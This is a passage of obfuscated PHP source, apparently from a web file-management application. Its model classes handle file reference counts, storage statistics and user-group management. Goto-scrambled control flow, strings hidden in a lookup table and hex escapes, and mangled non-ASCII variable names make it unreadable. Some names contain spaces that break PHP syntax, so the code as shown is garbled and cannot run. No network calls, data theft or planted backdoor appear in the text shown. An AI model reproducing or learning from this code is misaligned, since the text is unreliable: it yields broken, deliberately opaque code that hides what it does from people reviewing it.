$f˜×Œ™ÄšÍ) { goto C§éíç´Æœ; C§éíç´Æœ: $Döë…½¿ãæ =& $_SERVER[Ö]; if (!$EÙÖĞö ïœ) { return; } if (!is_array($EÙÖĞö ïœ)) { $EÙÖĞö ïœ = array($EÙÖĞö ïœ); } goto Eª£ê¯„ƒ; eì×Øòî•„: foreach ($A‡Œ‚Î¼Öõ as $F„‹¹¢¶…õ => $CšÚ¥„±ä—) { $E­óÆ˜Âè = $CšÚ¥„±ä— . $Döë…½¿ãæ[33]; if (!$fã¼ÜÈó[$E­óÆ˜Âè]) { $fã¼ÜÈó[$E­óÆ˜Âè] = array(); } $fã¼ÜÈó[$E­óÆ˜Âè][] = $F„‹¹¢¶…õ; } foreach ($fã¼ÜÈó as $CšÚ¥„±ä— => $BÍç§‹’¯) { if (!$BÍç§‹’¯) { continue; } $CšÚ¥„±ä— = $f˜×Œ™ÄšÍ ? $CšÚ¥„±ä— : -intval($CšÚ¥„±ä—); $aâøÊğ¨… = array($Döë…½¿ãæ[415] => array($Döë…½¿ãæ[7], $BÍç§‹’¯)); if ($CšÚ¥„±ä— < 0) { $aâøÊğ¨…[$Döë…½¿ãæ[2134]] = array($Döë…½¿ãæ[924], abs($CšÚ¥„±ä—)); } $this->where($aâøÊğ¨…)->setAdd($Döë…½¿ãæ[2134], $CšÚ¥„±ä—); } goto FÔ½‘; Eª£ê¯„ƒ: $A‡Œ‚Î¼Öõ = array(); foreach ($EÙÖĞö ïœ as $F„‹¹¢¶…õ) { $E­óÆ˜Âè = $F„‹¹¢¶…õ . $Döë…½¿ãæ[33]; if (!$A‡Œ‚Î¼Öõ[$E­óÆ˜Âè]) { $A‡Œ‚Î¼Öõ[$E­óÆ˜Âè] = 0; } $A‡Œ‚Î¼Öõ[$E­óÆ˜Âè]++; } $fã¼ÜÈó = array(); goto eì×Øòî•„; FÔ½‘: } public function findByHash($B©ÑŸîÄêÉ, $E ‰»„Êîˆ = false) { $fÏĞ’êÅº¿ =& $_SERVER[Ö]; if (!$B©ÑŸîÄêÉ && !$E ‰»„Êîˆ) { return !1; } $A–¦Ñ©•¹ = array($fÏĞ’êÅº¿[2132] => $B©ÑŸîÄêÉ); if ($E ‰»„Êîˆ) { $A–¦Ñ©•¹ = array($fÏĞ’êÅº¿[2133] => $E ‰»„Êîˆ); } return $this->order($fÏĞ’êÅº¿[2135])->where($A–¦Ñ©•¹)->find(); } public function clearEmpty($CµĞ±¿ÉĞ¥ = 0) { goto D²êğƒ·İƒ; a¸ĞÒ§Ò„í: foreach ($f×‘µ¿ÕÄ as $e²­­îñî) { $dË·—ó¨ó¼->update(1); $this->resetFile($e²­­îñî); } $dË·—ó¨ó¼->end(); goto fï¶Â†ï†; D²êğƒ·İƒ: $fŠé¾Ç…Ñ =& $_SERVER[Ö]; $B‰«‡¨ÈÄ· = time() - 3600 * 24 * $CµĞ±¿ÉĞ¥; $F­ÎÖ¾¸ùË = $fŠé¾Ç…Ñ[2136] . $B‰«‡¨ÈÄ·; goto Dó¿ÚãÃƒ; Dó¿ÚãÃƒ: $f×‘µ¿ÕÄ = $this->where($F­ÎÖ¾¸ùË)->select(); if (!$f×‘µ¿ÕÄ) { return; } $dË·—ó¨ó¼ = new Task($fŠé¾Ç…Ñ[2137], $fŠé¾Ç…Ñ[33], count($f×‘µ¿ÕÄ)); goto a¸ĞÒ§Ò„í; fï¶Â†ï†: } private function resetFile($cäŠÌ ÈïÇ) { goto D¶¬¿¿ìÆ¦; aÙ’Ö„Ñ·¿: if ($cäŠÌ ÈïÇ[$F§æ‰™Á†­[2134]] != $c‚‚óœÚÑŒ) { $this->where($bÉãŒä‹Ù·)->save(array($F§æ‰™Á†­[2131] => $c‚‚óœÚÑŒ)); } goto E ¡½÷ó¦¨; D¶¬¿¿ìÆ¦: $F§æ‰™Á†­ =& $_SERVER[Ö]; $bÉãŒä‹Ù· = array($F§æ‰™Á†­[416] => $cäŠÌ ÈïÇ[$F§æ‰™Á†­[415]]); $eáÈ•‚¶‚Ö = Model($F§æ‰™Á†­[1103])->where($bÉãŒä‹Ù·)->count(); goto C‚öÑïº­; C‚öÑïº­: $EøÚœøÅ¢ = Model($F§æ‰™Á†­[2138])->where($bÉãŒä‹Ù·)->count(); $c‚‚óœÚÑŒ = intval($eáÈ•‚¶‚Ö) + intval($EøÚœøÅ¢); if ($c‚‚óœÚÑŒ == 0) { IO::remove($cäŠÌ ÈïÇ[$F§æ‰™Á†­[75]]); $this->where($bÉãŒä‹Ù·)->delete(); $this->metaSet($cäŠÌ ÈïÇ[$F§æ‰™Á†­[415]], null, null); return; } goto aÙ’Ö„Ñ·¿; E ¡½÷ó¦¨: } public function storageInfo($bâ‹¤…ã¼ = false) { goto DÈãÒ¥ñ; DÈãÒ¥ñ: $F¤›ª‚íŞ¼ =& $_SERVER[Ö]; $cŠ×Éº‚˜¢ = $this->count() + 0.0; $Bê­šƒ½çò = 0; goto E¨àâ°®’; F¿¿÷Ì¶†­: for ($C•ø¸äßÂ = 0; $C•ø¸äßÂ < $cŠ×Éº‚˜¢; $C•ø¸äßÂ = $C•ø¸äßÂ + $dæòÏÇÑá) { $DªØ²ã˜Ü = $this->limit($C•ø¸äßÂ, $C•ø¸äßÂ + $dæòÏÇÑá)->select(); foreach ($DªØ²ã˜Ü as $cíØÙ†ÜˆÜ) { $fê‘Ûíƒßó += $cíØÙ†ÜˆÜ[$F¤›ª‚íŞ¼[77]] * $cíØÙ†ÜˆÜ[$F¤›ª‚íŞ¼[2134]]; $Bê­šƒ½çò += $cíØÙ†ÜˆÜ[$F¤›ª‚íŞ¼[77]] * ($cíØÙ†ÜˆÜ[$F¤›ª‚íŞ¼[2134]] - 1); $d²¤Âó¨–– += $cíØÙ†ÜˆÜ[$F¤›ª‚íŞ¼[2134]]; } } $C‹º–·Õö  = array($F¤›ª‚íŞ¼[2139] => $fê‘Ûíƒßó, $F¤›ª‚íŞ¼[2140] => $Bê­šƒ½çò, $F¤›ª‚íŞ¼[2141] => $Bê­šƒ½çò / $fê‘Ûíƒßó, $F¤›ª‚íŞ¼[81] => $cŠ×Éº‚˜¢, $F¤›ª‚íŞ¼[2142] => $d²¤Âó¨––); return $C‹º–·Õö ; goto eí²«¤“›×; E¨àâ°®’: $fê‘Ûíƒßó = 1; $d²¤Âó¨–– = 0; $dæòÏÇÑá = 5000; goto F¿¿÷Ì¶†­; eí²«¤“›×: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\x70"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\x61\x6d\x65" => "\x67\x72\157\165\x70\137\155\145\164\x61", "\155\145\x74\141\x46\151\x65\x6c\x64" => "\147\162\157\x75\x70\111\x44"); protected function cacheFunctionAlias($e±áƒ‰‘) { $cé”­’Ãæ =& $_SERVER[Ö]; return array($cé”­’Ãæ[2143] => array($e±áƒ‰‘[0], $cé”­’Ãæ[2144]), $cé”­’Ãæ[2145] => array($e±áƒ‰‘[0], $cé”­’Ãæ[2144])); } protected function getInfo($e…Ó­êÁ©Ğ) { $FéøÀŞè¼å = $this->getInfoSimple($e…Ó­êÁ©Ğ); if (!$FéøÀŞè¼å) { return !1; } return $this->_listDataApplyItem($FéøÀŞè¼å); } protected function getInfoSimple($aÀÔœ“È”Š, $aâ»×¦Á—Œ = false) { $FêƒŞ…Üëˆ =& $_SERVER[Ö]; if ($aâ»×¦Á—Œ) { $b‹»š†´ˆ® = array($FêƒŞ…Üëˆ[2077] => intval($aÀÔœ“È”Š)); $Bš¼»¿ÂÖô = $this->where($b‹»š†´ˆ®)->find(); return is_array($Bš¼»¿ÂÖô) ? $Bš¼»¿ÂÖô : array(); } return $this->cacheFunctionGet($FêƒŞ…Üëˆ[2146], $aÀÔœ“È”Š); } protected function groupAdd($cˆ×“›˜ã) { goto DÕ†¾Áê¬É; DİÕÚôµ: if (!empty($cˆ×“›˜ã[$Bù½ŠËÍß[2077]])) { $A…Ğğ±Ñ®[$Bù½ŠËÍß[2077]] = $cˆ×“›˜ã[$Bù½ŠËÍß[2077]]; } $e±ß¯áßÌ = $this->add($A…Ğğ±Ñ®); $this->setNamePinyin($e±ß¯áßÌ, $A…Ğğ±Ñ®[$Bù½ŠËÍß[28]]); goto Fãº¦ŠÔ…Ä; Fãº¦ŠÔ…Ä: Model($Bù½ŠËÍß[1103])->groupRootAdd($e±ß¯áßÌ); return $e±ß¯áßÌ; goto D‘Ò…®…‚²; DÕ†¾Áê¬É: $Bù½ŠËÍß =& $_SERVER[Ö]; if (!$cˆ×“›˜ã[$Bù½ŠËÍß[457]] && isset($cˆ×“›˜ã[$Bù½ŠËÍß[2077]]) && $cˆ×“›˜ã[$Bù½ŠËÍß[2077]] == 1) { if ($C™¬Ó­ê¶‡ = $this->getInfoSimple($cˆ×“›˜ã[$Bù½ŠËÍß[2077]], !0)) { return $cˆ×“›˜ã[$Bù½ŠËÍß[2077]]; } } else { $C™¬Ó­ê¶‡ = $this->getInfoSimple($cˆ×“›˜ã[$Bù½ŠËÍß[457]]); if (!$C™¬Ó­ê¶‡) { return !1; } } $fÉƒ¯˜º£æ = $Bù½ŠËÍß[466]; goto fÇˆËµÒ¥; fÇˆËµÒ¥: if ($C™¬Ó­ê¶‡[$Bù½ŠËÍß[455]]) { $fÉƒ¯˜º£æ = $C™¬Ó­ê¶‡[$Bù½ŠËÍß[455]] . $C™¬Ó­ê¶‡[$Bù½ŠËÍß[2077]] . $Bù½ŠËÍß[47]; } $A…Ğğ±Ñ® = array($Bù½ŠËÍß[382] => $this->groupNameAuto($cˆ×“›˜ã[$Bù½ŠËÍß[457]], $cˆ×“›˜ã[$Bù½ŠËÍß[28]]), $Bù½ŠËÍß[364] => $cˆ×“›˜ã[$Bù½ŠËÍß[457]], $Bù½ŠËÍß[521] => $fÉƒ¯˜º£æ, $Bù½ŠËÍß[2147] => $cˆ×“›˜ã[$Bù½ŠËÍß[2061]], $Bù½ŠËÍß[2148] => 0, $Bù½ŠËÍß[2081] => 0); if (isset($cˆ×“›˜ã[$Bù½ŠËÍß[2098]])) { $A…Ğğ±Ñ®[$Bù½ŠËÍß[2098]] = $cˆ×“›˜ã[$Bù½ŠËÍß[2098]]; } else { $E¾£æø¦± = $this->max($Bù½ŠËÍß[2098]); if (!$E¾£æø¦±) { $E¾£æø¦± = 0; } $A…Ğğ±Ñ®[$Bù½ŠËÍß[2098]] = $E¾£æø¦± + 1; } goto DİÕÚôµ; D‘Ò…®…‚²: } protected function groupEdit($Eå•ó¦…µ, $EÆñéòµŸ) { $FÅÁŠë…±¿ =& $_SERVER[Ö]; if (!empty($EÆñéòµŸ[$FÅÁŠë…±¿[457]])) { $eºÙ“‡¸ØÑ = $this->getInfoSimple($Eå•ó¦…µ); $d¸ğŒÃš‡Å = $this->getInfoSimple($EÆñéòµŸ[$FÅÁŠë…±¿[457]]); if (!$eºÙ“‡¸ØÑ || !$d¸ğŒÃš‡Å) { return !1; } if ($eºÙ“‡¸ØÑ[$FÅÁŠë…±¿[2077]] == $d¸ğŒÃš‡Å[$FÅÁŠë…±¿[2077]]) { return !1; } if ($EÆñéòµŸ[$FÅÁŠë…±¿[457]] != $eºÙ“‡¸ØÑ[$FÅÁŠë…±¿[457]]) { if ($d¸ğŒÃš‡Å[$FÅÁŠë…±¿[455]] !== $eºÙ“‡¸ØÑ[$FÅÁŠë…±¿[455]] && strpos($d¸ğŒÃš‡Å[$FÅÁŠë…±¿[455]], $eºÙ“‡¸ØÑ[$FÅÁŠë…±¿[455]] . $eºÙ“‡¸ØÑ[$FÅÁŠë…±¿[2077]] . $FÅÁŠë…±¿[47]) === 0) { return !1; } $EÆñéòµŸ[$FÅÁŠë…±¿[521]] = $d¸ğŒÃš‡Å[$FÅÁŠë…±¿[455]] . $EÆñéòµŸ[$FÅÁŠë…±¿[457]] . $FÅÁŠë…±¿[47]; $this->_changeChildLevel($eºÙ“‡¸ØÑ, $d¸ğŒÃš‡Å); } } if (isset($EÆñéòµŸ[$FÅÁŠë…±¿[28]])) { $this->setNamePinyin($Eå•ó¦…µ, $EÆñéòµŸ[$FÅÁŠë…±¿[28]]); } return $this->where(array($FÅÁŠë…±¿[2149] => $Eå•ó¦…µ))->save($EÆñéòµŸ); } private function _changeChildLevel($d×¹›Ê„¼“, $a£…‘ ĞÎæ, $B“”È¶ËŸ = false) { goto AÁƒ¶‚‹® ; eÛöœäº‚Ë: $this->where($Aê¬¯ƒŠ¯ì)->data($AÚ÷¢£óéƒ)->save(); goto Dõ„´ğùŒ›; A®²›£ÀÇÙ: if ($B“”È¶ËŸ) { $d…æâ¾‹‰È = $a£…‘ ĞÎæ[$f³š‹×Á‚Î[455]] . $a£…‘ ĞÎæ[$f³š‹×Á‚Î[2077]] . $f³š‹×Á‚Î[47]; } $Aê¬¯ƒŠ¯ì = array($f³š‹×Á‚Î[521] => array($f³š‹×Á‚Î[479], $d×¹›Ê„¼“[$f³š‹×Á‚Î[455]] . $d×¹›Ê„¼“[$f³š‹×Á‚Î[2077]] . $f³š‹×Á‚Î[480])); $AÚ÷¢£óéƒ = array($f³š‹×Á‚Î[521] => array($f³š‹×Á‚Î[530], "\x72\145\x70\x6c\x61\x63\145\x28\x70\x61\162\x65\x6e\164\114\145\x76\x65\154\54\x27{$aÕÙÃÍ«…Ì}\x27\x2c\x27{$d…æâ¾‹‰È}\47\51")); goto eÛöœäº‚Ë; AÁƒ¶‚‹® : $f³š‹×Á‚Î =& $_SERVER[Ö]; $aÕÙÃÍ«…Ì = $d×¹›Ê„¼“[$f³š‹×Á‚Î[455]] . $d×¹›Ê„¼“[$f³š‹×Á‚Î[2077]] . $f³š‹×Á‚Î[47]; $d…æâ¾‹‰È = $a£…‘ ĞÎæ[$f³š‹×Á‚Î[455]] . $a£…‘ ĞÎæ[$f³š‹×Á‚Î[2077]] . $f³š‹×Á‚Î[47] . $d×¹›Ê„¼“[$f³š‹×Á‚Î[2077]] . $f³š‹×Á‚Î[47]; goto A®²›£ÀÇÙ; Dõ„´ğùŒ›: } public function setNamePinyin($dé‰êˆ©´ô, $aî›ŠŒ‰¦ = false) { $aè«¼ÑËŸˆ =& $_SERVER[Ö]; if (!$aî›ŠŒ‰¦) { $fã×äĞÇ·Ñ = $this->getInfoSimple($dé‰êˆ©´ô); $aî›ŠŒ‰¦ = $fã×äĞÇ·Ñ[$aè«¼ÑËŸˆ[28]]; } if (!Input::check($aî›ŠŒ‰¦, $aè«¼ÑËŸˆ[524])) { $this->metaSet($dé‰êˆ©´ô, $aè«¼ÑËŸˆ[412], null); $this->metaSet($dé‰êˆ©´ô, $aè«¼ÑËŸˆ[411], null); return; } $fáÉ”ÌÛõ‰ = array($aè«¼ÑËŸˆ[412] => str_replace($aè«¼ÑËŸˆ[50], $aè«¼ÑËŸˆ[33], Pinyin::encode($aî›ŠŒ‰¦)), $aè«¼ÑËŸˆ[411] => Pinyin::encode($aî›ŠŒ‰¦, $aè«¼ÑËŸˆ[525])); $this->metaSet($dé‰êˆ©´ô, $fáÉ”ÌÛõ‰); } protected function groupStatus($Fíƒè¢øÖ”, $dƒ³™ò”Øç, $e¼ÕØøÄ÷ = true) { $A¼œèè›Åœ =& $_SERVER[Ö]; $dŠô‹ƒÓÌ° = $this->getInfoSimple($Fíƒè¢øÖ”); if (!$dŠô‹ƒÓÌ°) { return !1; } if ($e¼ÕØøÄ÷) { $this->_groupStatusApply($dŠô‹ƒÓÌ°, $dƒ³™ò”Øç); } $FÃŸÆ§ÌÍó = array($A¼œèè›Åœ[2077] => $Fíƒè¢øÖ”, $A¼œèè›Åœ[89] => $A¼œèè›Åœ[682], $A¼œèè›Åœ[355] => $dƒ³™ò”Øç); return Model($A¼œèè›Åœ[2150])->add($FÃŸÆ§ÌÍó, array(), !0); } private function _groupStatusApply($A¶ò›øïØÕ, $Dî½…É—•Ò) { $fÉ‚‡…š‹ =& $_SERVER[Ö]; if ($Dî½…É—•Ò == $fÉ‚‡…š‹[83]) { $cæ—Ü¾°…ß = $this->parentLevelArray($A¶ò›øïØÕ[$fÉ‚‡…š‹[455]]); } else { $FŒ„—…ÇùŞ = array($fÉ‚‡…š‹[521] => array($fÉ‚‡…š‹[479], $A¶ò›øïØÕ[$fÉ‚‡…š‹[455]] . $A¶ò›øïØÕ[$fÉ‚‡…š‹[2077]] . $fÉ‚‡…š‹[480])); $cæ—Ü¾°…ß = $this->where($FŒ„—…ÇùŞ)->field($fÉ‚‡…š‹[2077])->select(); $cæ—Ü¾°…ß = array_to_keyvalue($cæ—Ü¾°…ß, $fÉ‚‡…š‹[33], $fÉ‚‡…š‹[2077]); } if (empty($cæ—Ü¾°…ß)) { return; } $FŒ„—…ÇùŞ = array($fÉ‚‡…š‹[2077] => array($fÉ‚‡…š‹[7], $cæ—Ü¾°…ß), $fÉ‚‡…š‹[89] => $fÉ‚‡…š‹[682], $fÉ‚‡…š‹[355] => $Dî½…É—•Ò ? $fÉ‚‡…š‹[464] : $fÉ‚‡…š‹[83]); Model($fÉ‚‡…š‹[2150])->where($FŒ„—…ÇùŞ)->save(array($fÉ‚‡…š‹[355] => $Dî½…É—•Ò)); } protected function groupRemove($bğğ±ïàò) { goto B¶˜ÅÙ´ØÒ; B¶˜ÅÙ´ØÒ: $bÓ¼±‚•³É =& $_SERVER[Ö]; $EÒ¿ÛÑÖÏ = array($bÓ¼±‚•³É[2077] => $bğğ±ïàò); $a“„¹Ù—Âæ = $this->where($EÒ¿ÛÑÖÏ)->find(); goto Dğæ’¯¼À¾; BÖõÁƒÜóÜ: Model($bÓ¼±‚•³É[745])->groupRootRemove($bğğ±ïàò); return $this->where($EÒ¿ÛÑÖÏ)->delete(); goto f«èÕÈ±ºø; a–Ÿ‘ç‡ê: $this->where(array($bÓ¼±‚•³É[457] => $bğğ±ïàò))->save(array($bÓ¼±‚•³É[457] => $a“„¹Ù—Âæ[$bÓ¼±‚•³É[457]])); Model($bÓ¼±‚•³É[2150])->where($EÒ¿ÛÑÖÏ)->delete(); Model($bÓ¼±‚•³É[2151])->where($EÒ¿ÛÑÖÏ)->delete(); goto BÖõÁƒÜóÜ; Dğæ’¯¼À¾: if (!$a“„¹Ù—Âæ || $a“„¹Ù—Âæ[$bÓ¼±‚•³É[457]] == 0) { return !1; } $d¾í­º‡ŠÆ = $this->getInfoSimple($a“„¹Ù—Âæ[$bÓ¼±‚•³É[457]]); $this->_changeChildLevel($a“„¹Ù—Âæ, $d¾í­º‡ŠÆ, !0); goto a–Ÿ‘ç‡ê; f«èÕÈ±ºø: } public function listData() { $fŠïåªê‹„ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($fŠïåªê‹„[$_SERVER[Ö][350]]); return $fŠïåªê‹„; } private function _makeOrder($eç—ÌİÊêß = '') { goto c¯Ç×ÉÃ©…; FÂò’÷ƒ…ì: $eç—ÌİÊêß = $eç—ÌİÊêß . "{$B“‹¨ŠäÆ}\x20{$C­¯³ö¢’}\54\40\x67\162\x6f\x75\160\111\x44\40\141\x73\143"; return $this->order($eç—ÌİÊêß); goto f¢§‘±·£¥; c¯Ç×ÉÃ©…: $F¤ãĞÙ‰ÔÒ =& $_SERVER[Ö]; $dÕ¼çã©ğ = array($F¤ãĞÙ‰ÔÒ[2077], $F¤ãĞÙ‰ÔÒ[28], $F¤ãĞÙ‰ÔÒ[2063], $F¤ãĞÙ‰ÔÒ[183]); $dĞõ§ÇÃñ = array($F¤ãĞÙ‰ÔÒ[398] => $F¤ãĞÙ‰ÔÒ[399], $F¤ãĞÙ‰ÔÒ[400] => $F¤ãĞÙ‰ÔÒ[401]); goto a†ì¬‹çäğ; a†ì¬‹çäğ: $B“‹¨ŠäÆ = Input::get($F¤ãĞÙ‰ÔÒ[403], $F¤ãĞÙ‰ÔÒ[7], $F¤ãĞÙ‰ÔÒ[2081], $dÕ¼çã©ğ); $C­¯³ö¢’ = Input::get($F¤ãĞÙ‰ÔÒ[404], $F¤ãĞÙ‰ÔÒ[7], $F¤ãĞÙ‰ÔÒ[2152], array($F¤ãĞÙ‰ÔÒ[2152], $F¤ãĞÙ‰ÔÒ[400])); $C­¯³ö¢’ = $dĞõ§ÇÃñ[$C­¯³ö¢’]; goto FÂò’÷ƒ…ì; f¢§‘±·£¥: } public function listChild($F¾éØ•±ÇŒ) { $A…†›ãğ =& $_SERVER[Ö]; $Bšê”ÚÜâ = $this->where(array($A…†›ãğ[457] => $F¾éØ•±ÇŒ))->_makeOrder()->selectPage(200); $this->_listDataApply($Bšê”ÚÜâ[$A…†›ãğ[350]]); return $Bšê”ÚÜâ; } public function listByID($A§‚²…¸†ô) { $CÖÆ¡ÁÛˆ =& $_SERVER[Ö]; if (!$A§‚²…¸†ô) { return array(); } $fË¯öÉËÂÖ = array($CÖÆ¡ÁÛˆ[2077] => array($CÖÆ¡ÁÛˆ[7], $A§‚²…¸†ô)); $cè†Óœµ˜¸ = $this->where($fË¯öÉËÂÖ)->select(); $this->_listDataApply($cè†Óœµ˜¸); return $cè†Óœµ˜¸; } public function listSearch($D½ß †Å) { goto E¬µÛ„ã–â; AÀš¹²ÀÃ: $this->_listDataApply($báÖÅ•‹ª[$B÷¬ÃæÁØ[350]]); return $báÖÅ•‹ª; goto A§·øŒÆ¡¦; E¬µÛ„ã–â: $B÷¬ÃæÁØ =& $_SERVER[Ö]; $cŒÑˆŠ°ô = $D½ß †Å[$B÷¬ÃæÁØ[2153]]; $AÎÓœÔ÷‹Ÿ = isset($D½ß †Å[$B÷¬ÃæÁØ[2154]]) ? $D½ß †Å[$B÷¬ÃæÁØ[2154]] : !1; goto c¾¯©İ Æ³; c¾¯©İ Æ³: if (!trim($cŒÑˆŠ°ô)) { return !1; } $cŒÑˆŠ°ô = str_replace($B÷¬ÃæÁØ[2155], $B÷¬ÃæÁØ[2156], $cŒÑˆŠ°ô); $f¬ïØôõ½ = array($B÷¬ÃæÁØ[2077] => array($B÷¬ÃæÁØ[744], "\x25{$cŒÑˆŠ°ô}\x25"), $B÷¬ÃæÁØ[28] => array($B÷¬ÃæÁØ[744], "\x25{$cŒÑˆŠ°ô}\45"), $B÷¬ÃæÁØ[909] => $B÷¬ÃæÁØ[2157]); goto C…¯è‘Èšò; C…¯è‘Èšò: $báÖÅ•‹ª = $this->_makeOrder()->where($f¬ïØôõ½)->selectPage(20); $báÖÅ•‹ª = $báÖÅ•‹ª ? $báÖÅ•‹ª : array(); if (!$báÖÅ•‹ª || count($báÖÅ•‹ª[$B÷¬ÃæÁØ[350]]) < 5 && Input::check($cŒÑˆŠ°ô, $B÷¬ÃæÁØ[302])) { $eµ³Úèªïï = $this->_searchFromMeta($B÷¬ÃæÁØ[411], $cŒÑˆŠ°ô, 10); $A››ˆÄÎÒé = $this->_searchFromMeta($B÷¬ÃæÁØ[412], $cŒÑˆŠ°ô, 10); $F’Ô¼çÏª = array_merge($eµ³Úèªïï, $A››ˆÄÎÒé, $báÖÅ•‹ª[$B÷¬ÃæÁØ[350]]); $báÖÅ•‹ª[$B÷¬ÃæÁØ[350]] = array_unique_by_key($F’Ô¼çÏª, $B÷¬ÃæÁØ[2077]); $báÖÅ•‹ª[$B÷¬ÃæÁØ[347]][$B÷¬ÃæÁØ[348]] = count($báÖÅ•‹ª[$B÷¬ÃæÁØ[350]]); $báÖÅ•‹ª[$B÷¬ÃæÁØ[347]][$B÷¬ÃæÁØ[349]] = ceil($báÖÅ•‹ª[$B÷¬ÃæÁØ[347]][$B÷¬ÃæÁØ[348]] / $báÖÅ•‹ª[$B÷¬ÃæÁØ[347]][$B÷¬ÃæÁØ[345]]); } goto AÀš¹²ÀÃ; A§·øŒÆ¡¦: } private function _searchFromMeta($Cº£æö÷©, $déÒíÀ÷ìË, $DŒ…‰ŒÓåø) { goto Cë­ËºßÎ; FæïÉœå–°: $a™Å¶‰ ¶ê = Model($D¼ô”ší…Ÿ[2158])->where($aæ¦õ˜´ù)->limit($DŒ…‰ŒÓåø)->select(); if (!$a™Å¶‰ ¶ê) { return array(); } $a™Å¶‰ ¶ê = array_to_keyvalue($a™Å¶‰ ¶ê, $D¼ô”ší…Ÿ[33], $D¼ô”ší…Ÿ[2077]); goto AŒ‘†Ì¾øŠ; AŒ‘†Ì¾øŠ: $eˆ±†©ÓØ = $this->where(array($D¼ô”ší…Ÿ[2149] => array($D¼ô”ší…Ÿ[7], $a™Å¶‰ ¶ê)))->select(); if (!$eˆ±†©ÓØ) { return array(); } return $eˆ±†©ÓØ; goto A«ààÏÀ‚Ÿ; Cë­ËºßÎ: $D¼ô”ší…Ÿ =& $_SERVER[Ö]; $déÒíÀ÷ìË = strtolower($déÒíÀ÷ìË); $aæ¦õ˜´ù = array($D¼ô”ší…Ÿ[89] => $Cº£æö÷©, $D¼ô”ší…Ÿ[355] => array($D¼ô”ší…Ÿ[744], "\x25{$déÒíÀ÷ìË}\45")); goto FæïÉœå–°; A«ààÏÀ‚Ÿ: } protected function _listDataApplyItem($d”Ñ—…–ÌÏ) { $f£ºéÆÎù¢ = array($d”Ñ—…–ÌÏ); $this->_listDataApply($f£ºéÆÎù¢); return $f£ºéÆÎù¢[0]; } protected function _listDataApply(&$e›Õ“ÛáÌ²) { goto EÚ„ÔêÀ¹¼; AçŞ«¶Îæ¨: $this->_listAppendChildren($e›Õ“ÛáÌ²); $this->_listAppendChildrenMember($e›Õ“ÛáÌ²); $this->_listAppendMeta($e›Õ“ÛáÌ², $d„¦ÊÄ¤Ã); goto cóš‹óñô…; cóš‹óñô…: $this->_listAppendParent($e›Õ“ÛáÌ²); $this->_listAppendSourceRoot($e›Õ“ÛáÌ², $d„¦ÊÄ¤Ã); goto a¦ùØª’‰Ã; EÚ„ÔêÀ¹¼: $bŸå×’¨±› =& $_SERVER[Ö]; if (!$e›Õ“ÛáÌ²) { return; } $d„¦ÊÄ¤Ã = array_to_keyvalue($e›Õ“ÛáÌ², $bŸå×’¨±›[33], $bŸå×’¨±›[2077]); goto AçŞ«¶Îæ¨; a¦ùØª’‰Ã: } private function _listAppendChildren(&$cĞìç¬£×) { goto dò”èÂ¥÷; dò”èÂ¥÷: $DÏ›”ù¯İ =& $_SERVER[Ö]; $c‰À´°ªÏ = $DÏ›”ù¯İ[357]; $dÉó‡ë•¶œ = array(); goto Aº°ğ«ĞÜ; DõÖŠéªŸ: $dÉó‡ë•¶œ = array_to_keyvalue($dÉó‡ë•¶œ, $DÏ›”ù¯İ[446]); foreach ($cĞìç¬£× as &$fº›Ä‰ÅŠŒ) { $fº›Ä‰ÅŠŒ[$DÏ›”ù¯İ[2159]] = isset($dÉó‡ë•¶œ[$fº›Ä‰ÅŠŒ[$DÏ›”ù¯İ[2077]] . $DÏ›”ù¯İ[2160]]); } goto Eñƒ¼´òŠö; Aº°ğ«ĞÜ: $C”¨³¿¢óË = count($cĞìç¬£×); $dù½¹Œ»ÕÖ = $this->tablePrefix . $this->tableName; for ($B‘­å®ÛÒ¦ = 0, $B‹•¹Š¹öØ = 0; $B‘­å®ÛÒ¦ < $C”¨³¿¢óË; $B‘­å®ÛÒ¦++) { $B‹•¹Š¹öØ++; $F‘õ‹ˆôª± = $cĞìç¬£×[$B‘­å®ÛÒ¦][$DÏ›”ù¯İ[2077]]; $c‰À´°ªÏ .= "\x53\x45\x4c\x45\103\x54\x20\x2a\x20\106\122\117\115\40\50\123\x45\114\x45\x43\x54\x20\x27{$F‘õ‹ˆôª±}\137\x63\x68\151\154\x64\x27\x20\x61\x73\40\150\141\163\x20\106\x52\x4f\115\40\x60{$dù½¹Œ»ÕÖ}\x60\x20\x77\x68\145\162\x65\40\160\x61\x72\145\156\164\111\104\x3d{$F‘õ‹ˆôª±}\40\154\151\155\x69\x74\x20\61\51\40\141\163\40\x74\142\137{$F‘õ‹ˆôª±}\x20\x75\x6e\x69\x6f\156\40\x61\x6c\x6c\40"; if (($B‹•¹Š¹öØ >= 20 || $B‘­å®ÛÒ¦ == $C”¨³¿¢óË - 1) && $c‰À´°ªÏ) { $c‰À´°ªÏ = substr($c‰À´°ªÏ, 0, -strlen($DÏ›”ù¯İ[445])); $C”áÒš¹ = $this->query($c‰À´°ªÏ); $dÉó‡ë•¶œ = array_merge($dÉó‡ë•¶œ, $C”áÒš¹); $B‹•¹Š¹öØ = 0; $c‰À´°ªÏ = $DÏ›”ù¯İ[33]; } } goto DõÖŠéªŸ; Eñƒ¼´òŠö: } private function _listAppendChildrenMember(&$C‚ùó¥„à°) { goto eİÈø‘ÈÌ’; cÕÁ–±Ñ¤¨: $DŞ¨Œâ½  = count($C‚ùó¥„à°); $A°‡½ãÆöë = $this->tablePrefix . $CãÈÀ¨äæ§[2151]; for ($F¹³ºõŞ­· = 0, $eª´·ãò¯® = 0; $F¹³ºõŞ­· < $DŞ¨Œâ½ ; $F¹³ºõŞ­·++) { $eª´·ãò¯®++; $Dó²íÂ•¯ = $C‚ùó¥„à°[$F¹³ºõŞ­·][$CãÈÀ¨äæ§[2077]]; $B¹Ö®÷à×“ .= "\123\105\x4c\105\x43\x54\x20\x2a\x20\106\122\117\115\40\50\x53\x45\114\x45\103\x54\x20\47{$Dó²íÂ•¯}\x5f\x63\150\151\154\144\47\40\x61\163\40\x68\141\x73\x20\x46\x52\x4f\x4d\40\x60{$A°‡½ãÆöë}\x60\40\x77\x68\145\x72\x65\40\147\x72\157\165\x70\111\x44\75{$Dó²íÂ•¯}\40\x6c\x69\x6d\x69\164\40\x31\x29\x20\141\163\x20\x74\x62\x5f{$Dó²íÂ•¯}\x20\165\x6e\151\157\x6e\x20\141\154\154\x20"; if (($eª´·ãò¯® >= 20 || $F¹³ºõŞ­· == $DŞ¨Œâ½  - 1) && $B¹Ö®÷à×“) { $B¹Ö®÷à×“ = substr($B¹Ö®÷à×“, 0, 